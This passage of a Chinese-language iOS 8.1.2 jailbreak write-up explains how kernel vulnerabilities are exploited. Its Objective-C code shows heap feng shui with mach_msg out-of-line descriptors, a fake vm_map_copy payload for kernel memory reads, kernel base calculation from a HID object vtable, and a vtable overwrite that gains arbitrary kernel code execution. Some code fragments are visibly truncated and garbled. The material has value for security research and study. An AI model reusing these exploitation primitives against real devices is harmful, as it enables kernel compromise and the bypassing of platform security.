内核读主要利用的 mach_msg 的 ool descriptor,具体过程如下:
1、利用堆风水从 zone-256 中申请 8 个连续的内存块。
2、释放前面 5 个内存块。
3、向当前 Mach Task(untether)发送 mach 消息,消息带有 8 个 ool descriptor,每个 ool descriptor
的大小为:256 – sizeof(fake_vm_map_copy_64)。
    typedef struct fake_vm_map_copy_64_ {
        uint32_t type;
        uint64_t offset;
        uint64_t size;
        union {
            struct {
                uint8_t something[64];
            };
            uint64_t object;
            struct {
                uint64_t kdata;
                uint64_t kalloc_size;
            };
        };
    } fake_vm_map_copy_64;
表22:关键数据结构:fake_vm_map_copy_64
这样刚刚释放的内存块,就会被申请到。
4、释放堆风水中后面 3 个内存块。
5、触发漏洞,第 6 个内存块会被添加到 zone-1024 中。
6、再次向自己发消息,ool descriptor 的大小为: 960 – sizeof(fake_vm_map_copy_64),因为系统会从
zone-1024 中分配 960 大小的内存块,这样我们只要控制 960 内存块的内容就可以控制溢出。
7、控制溢出:
    - (void)constructPayload:(uint8_t *)buffer
              kobjectAddress:(mach_vm_address_t)kobject_address
                 readAddress:(mach_vm_address_t)address
                   _readSize:(mach_vm_size_t)size
    {
        // 0xA8 = 168(payload) = 256 - sizeof(fake_vm_map_copy_64)
        if (size type = 0x3;
                vm_copy_struct_ptr->size = size;
                vm_copy_struct_ptr->kdata = address;
                vm_copy_struct_ptr->kalloc_size = 0x100;
            }
            else {
                vm_copy_struct_ptr->type = 0x3;
                vm_copy_struct_ptr->size = 0xA8; // 0xA8 = 256 - 0x58 = 168 = ool memory size
                vm_copy_struct_ptr->kdata = kobject_address;
                vm_copy_struct_ptr->kalloc_size = 0x100;
            }
            vm_copy_struct_ptr = (mach_vm_address_t)vm_copy_struct_ptr + 0x100;
        }
    }
表23:控制溢出
8、直接接收消息,内核数据就被读到了用户空间。
下面这个代码片段(来源于网络)可以打印读到的内容,方便调试内核读:
    void HexDump(char *description, void *addr, int len)
    {
        int idx;
        unsigned char buff[17];
        unsigned char *pc = (unsigned char *)addr;
        // Output description if given.
        if (description != NULL)
            printf ("%s:n", description);
        // Process every byte in the data.
        for (idx = 0; idx  0x7e))
                buff[idx % 16] = '.';
            else
                buff[idx % 16] = pc[idx];
            buff[(idx % 16) + 1] = '';
        }
        // Pad out last line if not exactly 16 characters.
        while ((idx % 16) != 0) {
            printf ("   ");
            idx++;
        }
        // And print the final ASCII bit.
        printf (" | %sn", buff);
    }
表24:打印内存内容
### 内核信息泄露
内核信息泄露是在内核读基础之上实现的,利用过程如下:
1、利用前面提到的内核信息泄露漏洞得到某个内核对象的真实内核地址。
2、然后利用内核读,读取对象的内容内容。
3、从读到的内容中,取出第一个 mach_vm_address_t 大小的值,这个值代表对象虚函数表的地址。
4、再次利用内存读,读虚函数表的内容。
5、从读到的虚函数表的内容中选取一个函数指针。
最后,利用函数指针计算出内核的起始地址。这种方式没办法得到内核的结束地址,但是不影响越狱。
    - (mach_vm_address_t)getKernelBaseAddresses:
    (mach_vm_address_t)hid_event_obj_kaddress
    {
        // HID Event Object Memory Content
        unsigned char *hid_event_obj_content =
        [self readKernelMemoryAtAddress:hid_event_obj_kaddress + 0x1 size:0x100];
        unsigned long long *hid_event_service_queue_obj_ptr =
        (unsigned long long *)(hid_event_obj_content + 0xE0);
        // HID Event Service Queue Memory Content
        unsigned char *hid_event_service_queue_obj_content =
        [self readKernelMemoryAtAddress:*hid_event_service_queue_obj_ptr size:0x80];
        unsigned long long *hid_event_service_queue_vtable_ptr_0x10 =
        (unsigned long long *)(hid_event_service_queue_obj_content);
        unsigned char *hid_event_service_queue_vtable_content_0x10 =
        [self readKernelMemoryAtAddress:*hid_event_service_queue_vtable_ptr_0x10 size:0x18];
        unsigned long long *fifth_function_ptr_of_vtable =
        (unsigned long long *)(hid_event_service_queue_vtable_content_0x10 + 0x10);
        mach_vm_address_t kernel_base =
        ((*fifth_function_ptr_of_vtable - (0x200 << 12)) & 0xffffff80ffe00000) + 0x2000;
        return kernel_base;
    }
表25:计算内核基地址
### 内核任意代码执行
内核任意代码执行与内核读的利用思路相同,只是细节上有些差别,利用过程为:
1、利用内存映射,将一部分内核内存映射到用户空间。
2、通过内核读,计算出所映射的内存在内核中的真实地址。
3、构造一个虚函数表,填充到映射的内存中。
4、利用漏洞覆盖小对象的内存,只是 Payload 构造的主要目标是改写虚函数表指针。
5、调用 Hacked 的对象的方法,比如:释放,这样就控制了 PC 指针。
    - (void)arbitraryExecutationDemo
    {
        mach_port_name_t port_960 = 0;
        [self prepareReceivePort1:NULL port2:&port_960];
        io_connect_t fengshuiObjBuf[PRTS_ContinuousMemoryCount] = {0};
        mach_vm_address_t firstObjectKAddr = NULL;
        mach_vm_address_t lastObjectKAddr = NULL;
        [self allocObjects:fengshuiObjBuf
          firstObjectKAddr:&firstObjectKAddr
           lastObjectKAddr:&lastObjectKAddr];
        _fengshui_not_released_obj_count = PRTS_FengshuiObjectCountKeep;
        uint8_t ool_buf_960[0x400] = {0};
        [self constructArbitraryExePayload:ool_buf_960
                             vtableAddress:_fake_port_kernel_address_base];
        [self doFengshuiRelease2:fengshuiObjBuf];
        [self waitFengshuiService];
        [self triggerExploit];
        [self allocVMCopy:port_960
                     size:960
                   buffer:ool_buf_960
          descriptorCount:2];
        [self releaseResource];
        io_connect_t hacked_connection =
        fengshuiObjBuf[PRTS_ContinuousMemoryCount - _fengshui_not_released_obj_count - 1];
        printf("[+] start to trigger arbitrary executation, device will rebootn");
        IOServiceClose(hacked_connection);
        [self waitFengshuiService];
        printf("[+] success to trigger arbitrary executation, device will rebootn");
    }
表26:触发任意代码执行
[](http://nirvan.360.cn/blog/wp-content/uploads/2016/01/iOSJB812-EditVTable.png)
图10:改写虚函数表的结果示例
在完成内核任意代码执行后,就可以进一步实现了内核写,思路是:制造执行 memcpy 的 ROP Chain。
上面只是描述了如何利用漏洞,越狱工具还需要实现 Kernel Patch Finder,用来寻找 ROP Gadgets,然后构造出 ROP
Chain,Patch 掉内核的相关安全机制。
**八、修复、清理**
越狱工具进行的修复、清理操作主要包括:
1、修复堆状态,这是由于之前利用漏洞时破坏了堆状态,不修复会造成内核不稳定。
2、修复用户空间一些服务的状态。
**结束**
上面介绍了越狱的过程,越狱所使用的漏洞,以及漏洞的利用思路,希望对大家有帮助。最后,还有几点需要说明下:
1、iOS 8.1.2 越狱过程中使用了 7 个漏洞,其中用户空间 4 个,内核空间 3
个,可见过用户空间的防御是越狱过程中非常非常重要的部分,而且在用户空间多是利用的逻辑漏洞,这种漏洞应该会越来越少。
2、上文只是介绍了漏洞,而实际越狱工具的开发中,产品化是一个重要方面,具体来说主要指:稳定性;兼容性,可以看出开发一个好的越狱工具不是一件简单的事情。